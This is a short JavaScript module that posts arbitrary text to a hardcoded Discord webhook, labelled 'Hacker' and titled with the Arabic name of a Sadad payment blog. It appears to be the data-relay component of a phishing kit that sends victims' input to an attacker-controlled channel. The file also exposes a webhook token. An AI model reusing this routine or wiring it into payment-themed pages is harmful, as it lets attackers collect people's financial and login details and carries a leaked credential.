import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1363945413681348900/DuKeksisd4DGdEKPabWwNXDq4snOCVZpq0EiruBaLAX6ZVUb5A4tL6O_tPVDlabh2rcu",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
